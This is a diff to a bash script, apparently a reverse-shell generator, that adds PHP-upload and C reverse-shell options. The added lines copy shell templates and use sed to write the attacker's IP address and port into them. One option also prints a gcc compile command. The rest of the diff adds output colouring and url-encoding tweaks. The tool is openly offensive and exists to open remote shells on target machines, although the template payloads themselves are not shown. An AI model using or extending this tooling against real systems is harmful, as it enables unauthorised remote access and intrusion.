@@ -36,10 +36,17 @@ x=0
 
 PURPLE="35"
 BLUE="34"
+CYAN="36"
+RED="31"
+
 ENDCOLOR="\e[0m"
+
+BOLD="\e[1m"
+
 BOLDPURPLE="\e[1;${PURPLE}m"
 BOLDBLUE="\e[1;${BLUE}m"
-RED="\e[31m"
+BOLDRED="\e[1;${RED}m"
+BOLDCYAN="\e[1;${CYAN}m"
 
 urlencode() {
     # urlencode <string>
@@ -200,7 +207,24 @@ elif [ "$rev_shell" == "xterm" ]
 		rev_shell=$xterm
 		echo -e "To use this shell you need to authorize the target to connect to you using : xhost +targetip \non you machine\n"
 
-	
+elif [ "$rev_shell" == "php-upload" ]	
+	then
+		rev_shell="php_upload"
+		
+		cp reverse_shells/php_reverse_shell.php php-shell.php
+		sed -i -e "s/IPADDRESS/$ip4/g" php-shell.php
+		sed -i -e "s/PORTNUMBER/$pt/g" php-shell.php
+
+elif [ "$rev_shell" == "c" ]
+	then
+		rev_shell="c_reverse_shell"
+		
+		echo -e "${BOLDRED}Compile the shell using:${ENDCOLOR}${BOLD}$ gcc c-shell.c -o c-shell${ENDCOLOR}"
+		cp reverse_shells/c_reverse_shell.c c-shell.c
+		sed -i -e "s/IPADDRESS/$ip4/g" c-shell.c
+		sed -i -e "s/PORTNUMBER/$pt/g" c-shell.c
+
+
 else
 	echo "Invalid Format"
 	echo -e $options
@@ -210,17 +234,26 @@ fi
 
 
 
-echo -e "Using IP: ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
-echo -e "Using Port: ${BOLDBLUE}$pt${ENDCOLOR} \n"
-echo "Shell:"
+echo -e "${BOLD}Using IP:${ENDCOLOR} ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
+echo -e "${BOLD}Using Port:${ENDCOLOR} ${BOLDBLUE}$pt${ENDCOLOR} \n"
+echo -e "${BOLD}Shell:${ENDCOLOR}"
+if [ "$rev_shell" == "c_reverse_shell" ]
+then
+	echo -e "\e[1;38;5;220mCheck your current directory for a \" c-shell.c\" file${ENDCOLOR}"
+elif [ "$rev_shell" == "php_upload" ]
+	then
+		echo -e "\e[1;38;5;220mCheck your current directory for a \" php-shell.c\" file${ENDCOLOR}"
+else
+
 echo -e "\e[1;38;5;220m$rev_shell${ENDCOLOR} \n"
 command_not_found_handle() { echo "Install xclip for auto copy"; return 127; }
 echo -e "$rev_shell" | xclip -selection clipboard
 unset command_not_found_handle
+fi
 }
 
 
-options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm'
+options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm \n 9.php-upload \n 10.c'
 help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -p \t\t\t\t specify a port \n -x \t\t\t\t do not start a listener automatically \n -i \t\t\t\t choose custom interface \n -o \t\t\t\t show options/shells'
 
 
@@ -334,8 +367,14 @@ then
 
 	if [ $url ]
 	then
-		echo Url-encoded Shell:
+		echo -e "${BOLD}Url-encoded Shell:${ENDCOLOR}"
+		if [ "$rev_shell" == "php_upload" ] || [ "$rev_shell" == "c_reverse_shell" ]
+		then
+			echo -e "${BOLD}Not Applicable with this shell${ENDCOLOR}"
+		else
+		echo -e "${BOLDCYAN}"
 		urlencode "$rev_shell"
+	fi
 		echo -e "\n"
 			
 	fi
